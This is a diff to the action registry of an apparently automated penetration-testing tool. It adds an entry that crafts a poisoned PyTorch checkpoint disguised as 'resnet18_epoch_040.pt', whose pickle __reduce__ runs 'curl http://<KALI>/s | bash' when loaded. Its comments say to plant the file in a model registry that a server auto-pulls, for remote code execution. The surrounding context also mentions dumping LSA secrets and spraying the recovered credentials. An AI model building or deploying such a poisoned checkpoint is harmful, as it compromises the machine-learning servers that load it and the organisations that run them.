@@ -484,6 +484,21 @@ ACTION_REGISTRY: dict[str, Action] = {
         note="DefaultPassword is an LSA secret in the SECURITY hive; secretsdump LOCAL prints it. "
              "Feed any recovered cred to the vault + spray (Double_Hellix: this was the domain cred)."),
 
+    "craft_torch_checkpoint_pickle": _a("craft_torch_checkpoint_pickle",
+        ["python3 -c \"\n"
+         "import torch, os\n"
+         "class M(torch.nn.Module):\n"
+         "    def __init__(self):\n"
+         "        super().__init__(); self.l = torch.nn.Linear(10, 10)\n"
+         "    def __reduce__(self):\n"
+         "        return (os.system, ('curl http://<KALI>/s | bash',))\n"
+         "torch.save(M(), 'resnet18_epoch_040.pt')\"",
+         "# push resnet18_epoch_040.pt to the model registry/storage the server refreshes from;",
+         "# torch.load() (default weights_only=False) executes __reduce__ on load -> RCE."],
+        risk="propose", runnable=False, outputs="raw",
+        note="LLM03 supply chain: a poisoned .pt checkpoint. torch.load pickle-executes on load "
+             "unless weights_only=True. Land it in the registry the model server auto-pulls."),
+
     # --- AI advanced: pickle deserialization (self-learned from modules) ---
     "craft_pickle_sympify": _a("craft_pickle_sympify",
         ["python3 -c \"\n"
